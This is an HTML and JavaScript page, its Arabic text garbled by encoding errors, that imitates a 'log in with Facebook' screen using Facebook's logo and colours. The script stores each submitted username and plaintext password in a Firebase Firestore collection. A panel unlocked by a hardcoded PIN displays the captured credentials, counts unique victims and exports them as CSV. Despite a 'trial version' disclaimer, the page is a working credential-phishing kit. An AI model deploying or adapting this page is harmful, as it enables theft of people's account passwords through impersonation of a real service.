<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¹Ù†Ù‘ Ø·Ø±ÙŠÙ‚Ø© Facebook</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Segoe UI,Tahoma,Arial, sans-serif;background:linear-gradient(135deg,#1877f2 0%,#4e69a2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
    .container{background:#fff;border-radius:12px;max-width:700px;width:100%;padding:24px}
    .header{text-align:center;margin-bottom:18px}
    .logo{width:72px;height:72px;margin:0 auto 8px;border-radius:12px;background:#1877f2;display:flex;justify-content:center;align-items:center}
    .logo svg{width:40px;height:40px;fill:#fff}
    h1{font-size:20px;color:#222;margin-bottom:6px}
    .subtitle{font-size:13px;color:#666;margin-bottom:12px}
    .grid{display:grid;grid-template-columns:1fr 320px;gap:16px}
    form{background:#fafafa;padding:14px;border-radius:8px}
    label{display:block;margin-bottom:6px;font-weight:600;color:#333}
    input[type=text],input[type=password]{width:100%;padding:10px;border:1px solid #e3e3e3;border-radius:6px;margin-bottom:12px}
    button{display:inline-block;padding:10px 14px;border-radius:8px;border:none;background:#1877f2;color:#fff;font-weight:600;cursor:pointer}
    .admin-card{background:#fff;padding:12px;border-radius:8px}
    .msg{padding:10px;border-radius:6px;margin-bottom:10px;display:none}
    .msg.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb;display:block}
    .msg.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;display:block}
    #adminPanel{display:none;margin-top:12px}
    .log{background:#fff;padding:10px;border-radius:6px;margin-bottom:8px;border-right:4px solid #1877f2;word-break:break-word}
    .stats{display:flex;gap:8px;justify-content:space-between;margin-bottom:8px}
    .stat{background:#f6f8fb;padding:8px;border-radius:6px;text-align:center;flex:1}
    .small{background:#6c757d;padding:8px;border-radius:6px;color:#fff;border:none;cursor:pointer}
    @media(max-width:800px){.grid{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <div class="container" role="main">
    <div class="header">
      <div class="logo" aria-hidden="true">
        <svg viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.597 0 0 .597 0 1.325v21.351C0 23.403.597 24 1.325 24h11.49v-9.294H9.847V11.01h2.967V8.414c0-2.94 1.796-4.545 4.419-4.545 1.256 0 2.337.093 2.65.135v3.07h-1.82c-1.429 0-1.705.68-1.705 1.676v2.261h3.41l-.445 3.696h-2.965V24h5.813c.729 0 1.326-.597 1.326-1.324V1.325C24 .597 23.403 0 22.675 0z"/></svg>
      </div>
      <h1>Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¹Ù†Ù‘ Ø·Ø±ÙŠÙ‚Ø© Facebook</h1>
      <div class="subtitle">Ù†Ø³Ø®Ø© ØªØ¬Ø±ÙŠØ¨ÙŠØ© â€” Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø³ØªØ­ÙØ¸ Ø¹Ù„Ù‰ Firebase Firestore</div>
    </div>

    <div class="grid">
      <!-- Left: Login form -->
      <div>
        <form id="loginForm" aria-label="Ù†Ù…ÙˆØ°Ø¬ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„">
          <label for="username">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
          <input id="username" type="text" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" required>
          <label for="password">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
          <input id="password" type="password" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
          <div style="display:flex;gap:8px;align-items:center;margin-top:8px">
            <button type="submit" id="loginBtn">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
            <button type="button" id="fbSim" class="small" title="Ù…Ø­Ø§ÙƒØ§Ø© ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ ÙÙŠØ³Ø¨ÙˆÙƒ">Ù…Ø­Ø§ÙƒØ§Ø© Facebook</button>
          </div>
          <div id="msg" class="msg"></div>
        </form>

        <div style="margin-top:12px;padding:12px;background:#fff;border-radius:8px">
          <strong>Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ø£Ù…Ø§Ù†:</strong>
          <ul style="margin-top:8px;padding-left:16px;color:#444">
            <li>Ù‡Ø°Ù‡ Ù†Ø³Ø®Ø© ØªØ¬Ø±ÙŠØ¨ÙŠØ©. Ù…Ù† Ø§Ù„Ø£ÙØ¶Ù„ Ø¹Ø¯Ù… Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„Ù…Ø§Øª Ø³Ø± Ø­Ù‚ÙŠÙ‚ÙŠØ©.</li>
            <li>Ù„Ø£Ù…Ø§Ù† Ø­Ù‚ÙŠÙ‚ÙŠ Ø§Ø³ØªØ®Ø¯Ù… Firebase Authentication ÙˆHTTPS.</li>
          </ul>
        </div>
      </div>

      <!-- Right: Admin / PIN -->
      <div>
        <div class="admin-card">
          <div style="font-weight:700;margin-bottom:8px">Ø¹Ø±Ø¶ Ø³Ø¬Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª (ÙŠØªØ·Ù„Ø¨ PIN)</div>
          <label for="pin">Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù…Ø² (PIN)</label>
          <input id="pin" type="password" maxlength="6" placeholder="Ø£Ø¯Ø®Ù„ PIN">
          <div style="display:flex;gap:8px;margin-top:8px">
            <button id="showLogsBtn" class="small">Ø¹Ø±Ø¶ Ø§Ù„Ø³Ø¬Ù„</button>
            <button id="downloadCsv" class="small">ØªØ­Ù…ÙŠÙ„ CSV</button>
            <button id="clearLogsBtn" class="small" style="background:#dc3545">Ù…Ø³Ø­</button>
          </div>
          <div id="pinMsg" class="msg" style="margin-top:8px"></div>
        </div>

        <div id="adminPanel" aria-live="polite">
          <div class="stats" style="margin-top:12px">
            <div class="stat"><div style="font-size:18px" id="total">0</div><div style="font-size:12px;color:#666">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª</div></div>
            <div class="stat"><div style="font-size:18px" id="unique">0</div><div style="font-size:12px;color:#666">Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ø®ØªÙ„ÙÙŠÙ†</div></div>
          </div>
          <div id="logsList"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- Firebase SDKs -->
  <!-- 1) Ø¶Ø¹ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ø´Ø±ÙˆØ¹ Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ ÙÙŠ firebaseConfig Ø§Ù„Ù…ØªØºÙŠØ± Ø£Ø¯Ù†Ø§Ù‡ -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

  <script>
    // ======== Ø¥Ø¹Ø¯Ø§Ø¯ Firebase ========
    // Ø§Ø³ØªØ¨Ø¯Ù„ Ø§Ù„Ù‚ÙŠÙ… Ù‡Ù†Ø§ Ø¨Ù‚ÙŠÙ… Ù…Ø´Ø±ÙˆØ¹Ùƒ Ù…Ù† Console > Project settings
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_SENDER_ID",
      appId: "YOUR_APP_ID"
    };

    // ØªÙ‡ÙŠØ¦Ø©
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Ù…ÙØªØ§Ø­ Ø§Ø³Ù… Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©
    const LOGS_COLLECTION = "login_logs_v1";
    const ADMIN_PIN = "1997";

    // DOM
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const msg = document.getElementById('msg');
    const fbSim = document.getElementById('fbSim');
    const pinInput = document.getElementById('pin');
    const showLogsBtn = document.getElementById('showLogsBtn');
    const logsList = document.getElementById('logsList');
    const adminPanel = document.getElementById('adminPanel');
    const totalEl = document.getElementById('total');
    const uniqueEl = document.getElementById('unique');
    const pinMsg = document.getElementById('pinMsg');
    const downloadCsv = document.getElementById('downloadCsv');
    const clearLogsBtn = document.getElementById('clearLogsBtn');

    function showMessage(el, text, type='success', timeout=3000){
      el.textContent = text;
      el.className = 'msg ' + (type==='success' ? 'success' : 'error');
      if(timeout) setTimeout(()=>{ el.style.display='none'; el.className='msg'; }, timeout);
      el.style.display='block';
    }

    // Ø¥Ø¶Ø§ÙØ© Ø³Ø¬Ù„ Ø¥Ù„Ù‰ Firestore
    async function saveLogToFirestore(entry){
      try{
        await db.collection(LOGS_COLLECTION).add(entry);
        return true;
      }catch(err){
        console.error("Firestore write error:",err);
        return false;
      }
    }

    // Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± ØªØ³Ø¬ÙŠÙ„ (Ø­Ù‚ÙŠÙ‚ÙŠ)
    loginForm.addEventListener('submit', async function(e){
      e.preventDefault();
      const username = usernameInput.value.trim();
      const password = passwordInput.value;
      if(!username || !password){ showMessage(msg,'Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±','error'); return; }
      const entry = { username, password, timestamp: new Date().toISOString() , ua: navigator.userAgent };
      // Ø­ÙØ¸ ÙÙŠ Firestore
      const ok = await saveLogToFirestore(entry);
      if(ok){
        showMessage(msg,'âœ“ ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙˆØ­ÙØ¸Ù‡ ÙÙŠ Ø§Ù„Ø³Ø­Ø§Ø¨Ø©','success');
        loginForm.reset();
      }else{
        showMessage(msg,'âœ— Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø­ÙØ¸. ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯ Firebase ÙÙŠ Ø§Ù„ÙƒÙˆØ¯','error');
      }
    });

    // Ø²Ø± Ù…Ø­Ø§ÙƒØ§Ø© ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ³Ø¨ÙˆÙƒ (Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±)
    fbSim.addEventListener('click', async ()=>{
      const entry = { username: 'fb_user_'+Math.floor(Math.random()*1000), password: 'oauth_sim', timestamp: new Date().toISOString(), ua: navigator.userAgent };
      const ok = await saveLogToFirestore(entry);
      if(ok) showMessage(msg,'âœ“ ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ ØªØ³Ø¬ÙŠÙ„ ØªØ¬Ø±ÙŠØ¨ÙŠ ÙˆØ­ÙØ¸Ù‡','success');
      else showMessage(msg,'âœ— Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø­ÙØ¸','error');
    });

    // Ø¬Ù„Ø¨ Ø§Ù„Ø³Ø¬Ù„Ø§Øª ÙˆØ¹Ø±Ø¶Ù‡Ø§
    async function fetchLogsAndRender(){
      logsList.innerHTML = '<div class="log">Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>';
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).orderBy('timestamp','desc').get();
        const docs = snapshot.docs.map(d=>({id:d.id, ...d.data()}));
        if(docs.length===0){
          logsList.innerHTML = '<div class="empty-state"><div class="empty-state-icon">ğŸ“­</div><p>Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ø­Ø§ÙˆÙ„Ø§Øª ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†</p></div>';
          totalEl.textContent = '0'; uniqueEl.textContent='0';
          return;
        }
        totalEl.textContent = docs.length;
        const unique = new Set(docs.map(d=>d.username)).size;
        uniqueEl.textContent = unique;
        logsList.innerHTML = docs.map(d=>`<div class="log"><strong>Ø§Ø³Ù…:</strong> ${escapeHtml(d.username)}<br><strong>ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±:</strong> ${escapeHtml(d.password)}<div class="time">â° ${new Date(d.timestamp).toLocaleString()}</div></div>`).join('');
      }catch(err){
        console.error(err);
        logsList.innerHTML = '<div class="log">Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø³Ø¬Ù„Ø§Øª. ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase.</div>';
      }
    }

    // Ø²Ø± Ø¹Ø±Ø¶ Ø§Ù„Ø³Ø¬Ù„ - ÙŠØªØ­Ù‚Ù‚ Ù…Ù† PIN
    showLogsBtn.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      pinMsg.style.display='none';
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'âœ— Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­','error'); return; }
      adminPanel.style.display='block';
      await fetchLogsAndRender();
    });

    // ØªÙ†Ø²ÙŠÙ„ CSV
    downloadCsv.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'âœ— Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­','error'); return; }
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).orderBy('timestamp','desc').get();
        const docs = snapshot.docs.map(d=>d.data());
        if(docs.length===0){ showMessage(pinMsg,'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª Ù„Ù„ØªØ­Ù…ÙŠÙ„','error'); return; }
        const csv = toCSV(docs);
        const blob = new Blob([csv],{type:'text/csv;charset=utf-8;'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = 'login_logs.csv'; document.body.appendChild(a); a.click();
        URL.revokeObjectURL(url); a.remove();
      }catch(err){ console.error(err); showMessage(pinMsg,'Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ CSV','error'); }
    });

    function toCSV(arr){
      const keys = ['username','password','timestamp','ua'];
      const rows = [keys.join(',')];
      arr.forEach(o=>{
        rows.push(keys.map(k=>`"${String(o[k]||'').replace(/"/g,'""')}"`).join(','));
      });
      return rows.join('\n');
    }

    // Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª (ÙŠØ­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„ÙˆØ«Ø§Ø¦Ù‚ ÙÙŠ Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹Ø©) -> ÙŠØ­ØªØ§Ø¬ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙƒØªØ§Ø¨Ø©
    clearLogsBtn.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'âœ— Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­','error'); return; }
      if(!confirm('Ù‡Ù„ Ø£Ù†Øª Ù…ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø³Ø¬Ù„Ø§ØªØŸ')) return;
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).get();
        const batch = db.batch();
        snapshot.forEach(doc=> batch.delete(doc.ref));
        await batch.commit();
        showMessage(pinMsg,'âœ“ ØªÙ… Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„Ø§Øª','success');
        fetchLogsAndRender();
      }catch(err){ console.error(err); showMessage(pinMsg,'Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ù…Ø³Ø­. ØªØ­Ù‚Ù‚ Ù…Ù† ØµÙ„Ø§Ø­ÙŠØ§Øª Firestore','error'); }
    });

    // ÙˆØ¸ÙŠÙØ© Ù„ØªÙØ§Ø¯ÙŠ XSS Ø¹Ù†Ø¯ Ø§Ù„Ø¹Ø±Ø¶
    function escapeHtml(s){ if(!s && s!=='') return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
  </script>
</body>
</html>
